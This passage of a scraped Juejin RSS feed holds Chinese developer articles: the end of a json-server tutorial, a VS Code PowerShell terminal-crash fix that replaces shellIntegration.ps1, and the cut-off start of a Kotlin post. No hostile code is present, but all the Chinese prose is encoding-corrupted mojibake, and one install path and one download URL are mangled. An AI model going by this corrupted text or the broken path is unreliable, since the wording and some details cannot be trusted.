    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">put</span>(<span class="hljs-string">`/posts/<span class="hljs-subst">${id}</span>`</span>, post)
    <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>
  },
  
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">deletePost</span>(<span class="hljs-params">id</span>) {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">delete</span>(<span class="hljs-string">`/posts/<span class="hljs-subst">${id}</span>`</span>)
    <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>
  }
}
</code></pre>
<h3 data-id="heading-41">package.json é…ç½®</h3>
<h4 data-id="heading-42">æ·»åŠ è„šæœ¬</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"my-project"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"json-server"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"json-server --watch db.json --port 4000"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"dev"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"npm run json-server"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"json-server"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^0.17.3"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-43">è¿è¡Œè„šæœ¬</h4>
<pre><code class="hljs language-bash" lang="bash">npm run dev
</code></pre>
<h3 data-id="heading-44">å¸¸è§é—®é¢˜</h3>
<h4 data-id="heading-45">1. ç«¯å£è¢«å ç”¨</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨å…¶ä»–ç«¯å£</span>
json-server db.json --port 4000
</code></pre>
<h4 data-id="heading-46">2. CORS é—®é¢˜</h4>
<p>json-server é»˜è®¤å¯ç”¨ CORSï¼Œå¦‚æœé‡åˆ°é—®é¢˜ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¡®ä¿æ²¡æœ‰ç¦ç”¨ CORS</span>
json-server db.json
</code></pre>
<h4 data-id="heading-47">3. æ•°æ®æŒä¹…åŒ–</h4>
<p>json-server ä¼šå°†ä¿®æ”¹ä¿å­˜åˆ° <code>db.json</code> æ–‡ä»¶ä¸­ï¼Œç¡®ä¿æ–‡ä»¶æœ‰å†™å…¥æƒé™ã€‚</p>
<h4 data-id="heading-48">4. é‡ç½®æ•°æ®</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ é™¤ db.json æˆ–æ¢å¤å¤‡ä»½</span>
<span class="hljs-built_in">rm</span> db.json
<span class="hljs-built_in">cp</span> db.json.backup db.json
</code></pre>
<h3 data-id="heading-49">æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-50">1. ç‰ˆæœ¬æ§åˆ¶</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ·»åŠ åˆ° .gitignore</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"db.json"</span> &gt;&gt; .gitignore

<span class="hljs-comment"># åˆ›å»ºç¤ºä¾‹æ•°æ®æ–‡ä»¶</span>
<span class="hljs-built_in">cp</span> db.json db.example.json
</code></pre>
<h4 data-id="heading-51">2. ç¯å¢ƒé…ç½®</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// config.js</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">port</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">JSON_SERVER_PORT</span> || <span class="hljs-number">3000</span>,
  <span class="hljs-attr">host</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">JSON_SERVER_HOST</span> || <span class="hljs-string">'localhost'</span>,
  <span class="hljs-attr">watch</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> !== <span class="hljs-string">'production'</span>
}
</code></pre>
<h4 data-id="heading-52">3. æ•°æ®éªŒè¯</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// middleware.js</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> === <span class="hljs-string">'POST'</span> || req.<span class="hljs-property">method</span> === <span class="hljs-string">'PUT'</span>) {
    <span class="hljs-keyword">const</span> body = req.<span class="hljs-property">body</span>
    
    <span class="hljs-comment">// éªŒè¯å¿…å¡«å­—æ®µ</span>
    <span class="hljs-keyword">if</span> (!body.<span class="hljs-property">title</span>) {
      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>({ <span class="hljs-attr">error</span>: <span class="hljs-string">'Title is required'</span> })
    }
  }
  <span class="hljs-title function_">next</span>()
}
</code></pre>
<h4 data-id="heading-53">4. æ€§èƒ½ä¼˜åŒ–</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨é™æ€æ–‡ä»¶æœåŠ¡</span>
json-server db.json --static ./public

<span class="hljs-comment"># ç¦ç”¨æ—¥å¿—ï¼ˆç”Ÿäº§ç¯å¢ƒï¼‰</span>
json-server db.json --quiet
</code></pre>
<h3 data-id="heading-54">æ€»ç»“</h3>
<p>json-server æ˜¯ä¸€ä¸ªå¼ºå¤§ä¸”æ˜“äºä½¿ç”¨çš„å·¥å…·ï¼Œé€‚åˆï¼š</p>
<ul>
<li>âœ… å‰ç«¯å¼€å‘å’ŒåŸå‹è®¾è®¡</li>
<li>âœ… API æµ‹è¯•å’Œè°ƒè¯•</li>
<li>âœ… å¿«é€Ÿæ­å»ºæ¼”ç¤ºé¡¹ç›®</li>
<li>âœ… å­¦ä¹  REST API æ¦‚å¿µ</li>
</ul>
<p>é€šè¿‡æœ¬æ•™ç¨‹ï¼Œä½ åº”è¯¥èƒ½å¤Ÿï¼š</p>
<ul>
<li>å®‰è£…å’Œå¯åŠ¨ json-server</li>
<li>æ‰§è¡Œ CRUD æ“ä½œ</li>
<li>ä½¿ç”¨é«˜çº§æŸ¥è¯¢åŠŸèƒ½</li>
<li>è‡ªå®šä¹‰è·¯ç”±å’Œä¸­é—´ä»¶</li>
<li>ä¸å‰ç«¯æ¡†æ¶é›†æˆ</li>
</ul>
<p>å¼€å§‹ä½¿ç”¨ json-serverï¼Œå¿«é€Ÿæ„å»ºä½ çš„ REST API å§ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VS Code ç»ˆç«¯å´©æºƒé—®é¢˜åˆ†æä¸è§£å†³æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7590020026395574326</link>    <guid>https://juejin.cn/post/7590020026395574326</guid>    <pubDate>2026-01-03T02:35:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590020026395574326" data-draft-id="7589919989039480895" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VS Code ç»ˆç«¯å´©æºƒé—®é¢˜åˆ†æä¸è§£å†³æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-03T02:35:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‡¯å“¥1970"/> <meta itemprop="url" content="https://juejin.cn/user/3954283342211335"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VS Code ç»ˆç«¯å´©æºƒé—®é¢˜åˆ†æä¸è§£å†³æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3954283342211335/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‡¯å“¥1970
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-03T02:35:40.000Z" title="Sat Jan 03 2026 02:35:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">VS Code ç»ˆç«¯å´©æºƒé—®é¢˜åˆ†æä¸è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-1">é”™è¯¯ä»£ç ï¼š<code>-2147023895 (0x800703E9)</code></h3>
<p>æ˜¾ç¤ºå¦‚ä¸‹</p>
<pre><code class="hljs language-shell" lang="shell">ç»ˆç«¯è¿›ç¨‹â€œC:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exeâ€å·²ç»ˆæ­¢ï¼Œé€€å‡ºä»£ç : -2147023895ã€‚
</code></pre>
<h4 data-id="heading-2">é—®é¢˜æè¿°</h4>
<p>åœ¨ VS Code ä¸­æ‰“å¼€ç»ˆç«¯æ—¶ï¼ŒPowerShell è¿›ç¨‹å¼‚å¸¸é€€å‡ºï¼Œè¿”å›é”™è¯¯ä»£ç Â <code>-2147023895</code>ã€‚è¯¥é”™è¯¯ä¼šå¯¼è‡´ç»ˆç«¯æ— æ³•æ­£å¸¸å¯åŠ¨æˆ–ä½¿ç”¨ï¼Œå½±å“å¼€å‘æ•ˆç‡ã€‚</p>
<hr/>
<h4 data-id="heading-3">é”™è¯¯åŸå› åˆ†æ</h4>
<p>é”™è¯¯ä»£ç Â <code>-2147023895</code>Â å¯¹åº”åå…­è¿›åˆ¶å€¼Â <code>0x800703E9</code>ï¼Œæ˜¯ä¸€ä¸ªæ ‡å‡†çš„Â <strong>HRESULT é”™è¯¯ç </strong>ï¼Œå…¶ç»“æ„è§£æå¦‚ä¸‹ï¼š</p>
<ul>
<li><strong>ä¸¥é‡æ€§ä½ï¼ˆBit 31ï¼‰</strong> ï¼š1ï¼Œè¡¨ç¤ºå¤±è´¥ã€‚</li>
<li><strong>è®¾å¤‡ä»£ç ï¼ˆBits 16-26ï¼‰</strong> ï¼š7ï¼ˆ<code>FACILITY_WIN32</code>ï¼‰ï¼Œè¡¨ç¤ºé”™è¯¯æºè‡ª Windows API è°ƒç”¨ã€‚</li>
<li><strong>ä½ä½ä»£ç ï¼ˆBits 0-15ï¼‰</strong> ï¼š<code>0x03E9</code>ï¼ˆåè¿›åˆ¶ 1001ï¼‰ã€‚</li>
</ul>
<h5 data-id="heading-4">å¯èƒ½çš„åŸå› ï¼š</h5>
<ol>
<li><strong>æ ˆæº¢å‡ºï¼ˆStack Overflowï¼‰</strong><br/>
PowerShell å¯åŠ¨æ—¶è„šæœ¬é™·å…¥æ— é™é€’å½’ï¼Œè€—å°½çº¿ç¨‹æ ˆç©ºé—´ï¼Œè§¦å‘ç³»ç»Ÿå¼‚å¸¸ã€‚</li>
<li><strong>æ–‡ä»¶å®Œæ•´æ€§æ ¡éªŒå¤±è´¥ï¼ˆInvalid Image Hashï¼‰</strong><br/>
Windows ä»£ç å®Œæ•´æ€§æœºåˆ¶æˆ–å®‰å…¨è½¯ä»¶ï¼ˆå¦‚ AppLockerï¼‰æ£€æµ‹åˆ°è„šæœ¬æ–‡ä»¶ç­¾åæ— æ•ˆã€æ–‡ä»¶æŸåæˆ–å“ˆå¸Œä¸åŒ¹é…ï¼Œå¯¼è‡´åŠ è½½è¢«æ‹’ç»ã€‚</li>
<li><strong>ç¯å¢ƒå˜é‡å†²çª</strong><br/>
è„šæœ¬æ‰§è¡Œè¿‡ç¨‹ä¸­å±•å¼€çš„ç¯å¢ƒå˜é‡ï¼ˆå¦‚Â <code>PATH</code>ï¼‰è¿‡é•¿ï¼Œå¼•å‘å†…å­˜æˆ–æ ˆæº¢å‡ºã€‚</li>
</ol>
<h4 data-id="heading-5">æ ¹æœ¬åŸå› å®šä½</h4>
<p>å¤šæ•°æƒ…å†µä¸‹ï¼Œè¯¥é”™è¯¯ä¸Â <strong>VS Code ç»ˆç«¯ Shell é›†æˆè„šæœ¬</strong>Â <code>shellIntegration.ps1</code>Â æœ‰å…³ã€‚è¯¥è„šæœ¬åœ¨ç»ˆç«¯å¯åŠ¨æ—¶è¢«è‡ªåŠ¨åŠ è½½ï¼Œè‹¥æ–‡ä»¶æŸåæˆ–ä¸ç”¨æˆ·é…ç½®å†²çªï¼Œå³ä¼šè§¦å‘ä¸Šè¿°é”™è¯¯ã€‚</p>
<hr/>
<h4 data-id="heading-6">è§£å†³æ–¹æ¡ˆï¼šæ‰‹åŠ¨æ›¿æ¢è„šæœ¬æ–‡ä»¶ï¼ˆæ²»æœ¬ï¼‰</h4>
<p>æ— éœ€ç¦ç”¨ç»ˆç«¯åŠŸèƒ½ï¼Œç›´æ¥æ›¿æ¢æŸåçš„è„šæœ¬æ–‡ä»¶å³å¯æ ¹æ²»é—®é¢˜ã€‚</p>
<h5 data-id="heading-7">æ“ä½œæ­¥éª¤ï¼š</h5>
<ol>
<li>
<p><strong>å®šä½è„šæœ¬æ–‡ä»¶</strong><br/>
æ ¹æ® VS Code å®‰è£…æ–¹å¼ï¼Œæ‰¾åˆ°ç›®æ ‡ç›®å½•ï¼š</p>
<ul>
<li><strong>ç”¨æˆ·å®‰è£…</strong>ï¼š<br/>
<code>%LOCALAPPDATA%\Programs&lt;EditorName&gt;\resources\app\out\vs\workbench\contrib\terminal\common\scripts</code></li>
<li><strong>ç³»ç»Ÿå®‰è£…</strong>ï¼š<br/>
<code>C:\Program Files\Microsoft VS Code\resources\app\out\vs\workbench\contrib\terminal\common\scripts</code></li>
</ul>
</li>
<li>
<p><strong>å¤‡ä»½åŸæ–‡ä»¶</strong><br/>
å°†ç›®å½•ä¸­çš„Â <code>shellIntegration.ps1</code>Â é‡å‘½åä¸ºÂ <code>shellIntegration.ps1.bak</code>ï¼Œä½œä¸ºå¤‡ä»½ã€‚</p>
</li>
<li>
<p><strong>ä¸‹è½½å®˜æ–¹è„šæœ¬</strong><br/>
è®¿é—® VS Code å®˜æ–¹ GitHub ä»“åº“ï¼Œä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„è„šæœ¬æ–‡ä»¶ï¼š<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fraw.githubusercontent.com%2Fmicrosoft%2Fvscode%2Fmain%2Fsrc%2Fvs%2Fworkbench%2Fcontrib%255Cterminal%255Ccommon%255Cscripts%255CshellIntegration.ps1" target="_blank" title="https://raw.githubusercontent.com/microsoft/vscode/main/src/vs/workbench/contrib%5Cterminal%5Ccommon%5Cscripts%5CshellIntegration.ps1" ref="nofollow noopener noreferrer">raw.githubusercontent.com/microsoft/vâ€¦</a></p>
</li>
<li>
<p><strong>æ›¿æ¢æ–‡ä»¶</strong><br/>
å°†ä¸‹è½½çš„Â <code>shellIntegration.ps1</code>Â å¤åˆ¶åˆ°æ­¥éª¤ 1 çš„ç›®å½•ä¸­ï¼Œç¡®ä¿å½“å‰ç”¨æˆ·æœ‰è¯»å–æƒé™ã€‚</p>
</li>
<li>
<p><strong>é‡å¯éªŒè¯</strong><br/>
å®Œå…¨å…³é—­ VS Codeï¼ˆåŒ…æ‹¬åå°è¿›ç¨‹ï¼‰ï¼Œé‡æ–°å¯åŠ¨å¹¶æ‰“å¼€ç»ˆç«¯ï¼Œæ£€æŸ¥æ˜¯å¦æ¢å¤æ­£å¸¸ã€‚</p>
</li>
</ol>
<hr/>
<h4 data-id="heading-8">æ–¹æ¡ˆåŸç†</h4>
<p>é€šè¿‡æ›¿æ¢ä¸ºå®˜æ–¹å®Œå¥½çš„è„šæœ¬æ–‡ä»¶ï¼Œç¡®ä¿ï¼š</p>
<ul>
<li>PowerShell è§£æå™¨èƒ½æ­£å¸¸è§£æè¯­æ³•ï¼Œé¿å…å› æ–‡ä»¶æŸåå¯¼è‡´çš„å´©æºƒã€‚</li>
<li>è„šæœ¬ä¸ç”¨æˆ·ç¯å¢ƒå…¼å®¹ï¼Œé¿å…é€’å½’å†²çªæˆ–å®‰å…¨æ ¡éªŒå¤±è´¥ã€‚</li>
<li>ä¿ç•™å®Œæ•´çš„ç»ˆç«¯ Shell é›†æˆåŠŸèƒ½ï¼ˆå¦‚å‘½ä»¤è£…é¥°ã€çŠ¶æ€æç¤ºç­‰ï¼‰ã€‚</li>
</ul>
<hr/>
<h4 data-id="heading-9">æ³¨æ„äº‹é¡¹</h4>
<ul>
<li>è‹¥é—®é¢˜ä»ç„¶å­˜åœ¨ï¼Œå¯æ£€æŸ¥ç”¨æˆ· PowerShell é…ç½®æ–‡ä»¶ï¼ˆ<code>$PROFILE</code>ï¼‰ä¸­æ˜¯å¦å­˜åœ¨ä¸ Shell é›†æˆå†²çªçš„è‡ªå®šä¹‰ä»£ç ã€‚</li>
<li>å»ºè®®å®šæœŸæ›´æ–° VS Codeï¼Œä»¥è·å–å®˜æ–¹ä¿®å¤çš„è„šæœ¬ç‰ˆæœ¬ã€‚</li>
</ul>
<hr/>
<p>é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œå¯ä»æ ¹æœ¬ä¸Šè§£å†³ç»ˆç«¯å´©æºƒé—®é¢˜ï¼Œæ— éœ€ä¸´æ—¶ç¦ç”¨åŠŸèƒ½æˆ–ä¿®æ”¹å¯åŠ¨å‘½ä»¤ï¼Œç¡®ä¿å¼€å‘ç¯å¢ƒç¨³å®šå¯ç”¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kotlin extensionsæ˜¯ä»€ä¹ˆï¼Ÿ]]></title>    <link>https://juejin.cn/post/7590503651141419034</link>    <guid>https://juejin.cn/post/7590503651141419034</guid>    <pubDate>2026-01-03T02:24:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590503651141419034" data-draft-id="7590292138346610698" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kotlin extensionsæ˜¯ä»€ä¹ˆï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-03T02:24:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Poorguy9527"/> <meta itemprop="url" content="https://juejin.cn/user/1746465251931063"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kotlin extensionsæ˜¯ä»€ä¹ˆï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1746465251931063/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Poorguy9527
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-03T02:24:20.000Z" title="Sat Jan 03 2026 02:24:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul 